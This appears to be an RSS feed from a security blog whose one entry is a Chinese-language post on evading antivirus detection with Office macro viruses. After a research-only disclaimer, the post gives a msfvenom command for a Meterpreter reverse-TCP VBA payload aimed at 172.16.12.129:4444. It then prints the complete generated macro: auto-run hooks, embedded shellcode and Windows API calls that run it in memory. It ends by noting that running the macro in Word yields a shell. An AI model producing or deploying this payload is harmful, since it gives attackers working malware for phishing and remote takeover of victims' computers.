<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>免杀 on Y4ph3tS blog</title>
    <link>http://localhost:1313/tags/%E5%85%8D%E6%9D%80/</link>
    <description>Recent content in 免杀 on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Wed, 04 Nov 2020 10:24:11 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/%E5%85%8D%E6%9D%80/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>宏免杀分析</title>
      <link>http://localhost:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</link>
      <pubDate>Wed, 04 Nov 2020 10:24:11 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;宏病毒攻击方式的分析与研究&#34;&gt;宏病毒攻击方式的分析与研究&lt;/h1&gt;&#xA;&lt;p&gt;在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。&lt;/p&gt;&#xA;&lt;h2 id=&#34;什么是宏病毒&#34;&gt;什么是宏病毒&lt;/h2&gt;&#xA;&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的危害&#34;&gt;宏病毒的危害&lt;/h2&gt;&#xA;&lt;p&gt;主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的生成&#34;&gt;宏病毒的生成&lt;/h2&gt;&#xA;&lt;h3 id=&#34;msf生成宏&#34;&gt;MSF生成宏&lt;/h3&gt;&#xA;&lt;p&gt;MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.12.129 lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -f vba -o msf.vba&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;宏的内容如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;#If Vba7 Then&#xD;&#xA;&#x9;Private Declare PtrSafe Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Private Declare Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As Long&#xD;&#xA;&#x9;Private Declare Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As Long&#xD;&#xA;&#x9;Private Declare Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;&#x9;Dim Ltw As Long, Eso As Variant, Ytpg As Long&#xD;&#xA;#If Vba7 Then&#xD;&#xA;&#x9;Dim  Tpgwi As LongPtr, Ivlfxyv As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Dim  Tpgwi As Long, Ivlfxyv As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#x9;Eso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _&#xD;&#xA;207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _&#xD;&#xA;0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _&#xD;&#xA;131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _&#xD;&#xA;255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)&#xD;&#xA;&#xD;&#xA;&#x9;Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;&#x9;For Ytpg = LBound(Eso) To UBound(Eso)&#xD;&#xA;&#x9;&#x9;Ltw = Eso(Ytpg)&#xD;&#xA;&#x9;&#x9;Ivlfxyv = RtlMoveMemory(Tpgwi + Ytpg, Ltw, 1)&#xD;&#xA;&#x9;Next Ytpg&#xD;&#xA;&#x9;Ivlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用msf进行监听，之后在word中运行宏即可获得shell&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
